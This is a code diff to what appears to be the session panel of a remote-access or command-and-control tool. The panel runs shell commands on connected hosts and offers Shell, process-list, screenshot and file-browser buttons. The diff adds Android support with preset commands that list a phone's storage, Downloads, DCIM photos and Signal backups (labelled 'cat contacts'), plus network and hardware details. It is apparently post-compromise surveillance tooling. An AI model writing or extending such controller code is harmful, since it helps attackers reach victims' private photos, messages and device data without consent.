@@ -54,6 +54,18 @@ const QUICK_UNIX = [
   { label: 'crontab -l',  cmd: 'crontab -l' },
   { label: 'env',         cmd: 'env' },
 ]
+const QUICK_ANDROID = [
+  { label: 'id',            cmd: 'id' },
+  { label: 'uname -a',      cmd: 'uname -a' },
+  { label: 'env',           cmd: 'env' },
+  { label: 'ls /sdcard',    cmd: 'ls /sdcard' },
+  { label: 'ls Downloads',  cmd: 'ls /sdcard/Download' },
+  { label: 'ls DCIM',       cmd: 'ls /sdcard/DCIM' },
+  { label: 'cat contacts',  cmd: 'ls /sdcard/Signal\\ BackUp/ 2>/dev/null || echo no-signal' },
+  { label: 'net info',      cmd: 'cat /proc/net/if_inet6 2>/dev/null; ip route 2>/dev/null || true' },
+  { label: 'cpu info',      cmd: 'cat /proc/cpuinfo | grep Hardware | head -3' },
+  { label: 'storage',       cmd: 'df -h /sdcard /data 2>/dev/null' },
+]
 
 function fmtBytes(b: number) {
   return b >= 1 << 20 ? `${(b / (1 << 20)).toFixed(1)}M` : b >= 1024 ? `${(b / 1024).toFixed(1)}K` : `${b}B`
@@ -199,8 +211,10 @@ export default function Sessions({ onOpenTerminal }: Props) {
       ) : (
         <div className="flex flex-col gap-2">
           {sessions.map(s => {
-            const isWin = s.os?.toLowerCase().includes('windows')
-            const quick = isWin ? QUICK_WIN : QUICK_UNIX
+            const osLow  = s.os?.toLowerCase() ?? ''
+            const isWin     = osLow.includes('windows')
+            const isAndroid = osLow.includes('android')
+            const quick  = isWin ? QUICK_WIN : isAndroid ? QUICK_ANDROID : QUICK_UNIX
             const isExp = expanded === s.id
             const myRes = execResults[s.id] ?? []
             const isExec = executing === s.id
@@ -230,17 +244,21 @@ export default function Sessions({ onOpenTerminal }: Props) {
                       className="flex items-center gap-1 px-2 py-1.5 rounded text-[11px] text-primary bg-primary/10 border border-primary/30 hover:bg-primary/20 transition-colors">
                       <Terminal size={11} /> Shell
                     </button>
-                    {/* PS */}
-                    <button onClick={() => openPS(s)} disabled={psLoading === s.id}
-                      className="flex items-center gap-1 px-2 py-1.5 rounded text-[11px] text-accent bg-accent/10 border border-accent/30 hover:bg-accent/20 transition-colors disabled:opacity-40">
-                      {psLoading === s.id ? <Loader size={11} className="animate-spin" /> : <List size={11} />} PS
-                    </button>
-                    {/* Screenshot */}
-                    <button onClick={() => openScreenshot(s)} disabled={shotLoading === s.id}
-                      className="flex items-center gap-1 px-2 py-1.5 rounded text-[11px] text-purple bg-purple/10 border border-purple/30 hover:bg-purple/20 transition-colors disabled:opacity-40"
-                      title="Screenshot">
-                      {shotLoading === s.id ? <Loader size={11} className="animate-spin" /> : <Camera size={11} />}
-                    </button>
+                    {/* PS — not supported on Android */}
+                    {!isAndroid && (
+                      <button onClick={() => openPS(s)} disabled={psLoading === s.id}
+                        className="flex items-center gap-1 px-2 py-1.5 rounded text-[11px] text-accent bg-accent/10 border border-accent/30 hover:bg-accent/20 transition-colors disabled:opacity-40">
+                        {psLoading === s.id ? <Loader size={11} className="animate-spin" /> : <List size={11} />} PS
+                      </button>
+                    )}
+                    {/* Screenshot — not supported on Android */}
+                    {!isAndroid && (
+                      <button onClick={() => openScreenshot(s)} disabled={shotLoading === s.id}
+                        className="flex items-center gap-1 px-2 py-1.5 rounded text-[11px] text-purple bg-purple/10 border border-purple/30 hover:bg-purple/20 transition-colors disabled:opacity-40"
+                        title="Screenshot">
+                        {shotLoading === s.id ? <Loader size={11} className="animate-spin" /> : <Camera size={11} />}
+                      </button>
+                    )}
                     {/* Files */}
                     <button onClick={() => openFS(s)} disabled={fsLoading === s.id}
                       className="flex items-center gap-1 px-2 py-1.5 rounded text-[11px] text-warn bg-warn/10 border border-warn/30 hover:bg-warn/20 transition-colors disabled:opacity-40"
@@ -281,7 +299,7 @@ export default function Sessions({ onOpenTerminal }: Props) {
                       <input value={customCmd[s.id] ?? ''} disabled={isExec}
                         onChange={e => setCustomCmd(p => ({ ...p, [s.id]: e.target.value }))}
                         onKeyDown={e => { if (e.key === 'Enter' && customCmd[s.id]?.trim()) { execute(s, customCmd[s.id]); setCustomCmd(p => ({ ...p, [s.id]: '' })) } }}
-                        placeholder={isWin ? 'cmd.exe /c <cmd>' : '/bin/bash -c <cmd>'}
+                        placeholder={isWin ? 'cmd.exe /c <cmd>' : isAndroid ? 'ls /sdcard  or  id  or  uname -a' : '/bin/bash -c <cmd>'}
                         className="flex-1 bg-bg border border-border rounded px-3 py-2 text-xs font-mono text-text placeholder-muted focus:border-warn outline-none" />
                       <button onClick={() => { if (customCmd[s.id]?.trim()) { execute(s, customCmd[s.id]); setCustomCmd(p => ({ ...p, [s.id]: '' })) } }}
                         disabled={isExec || !customCmd[s.id]?.trim()}
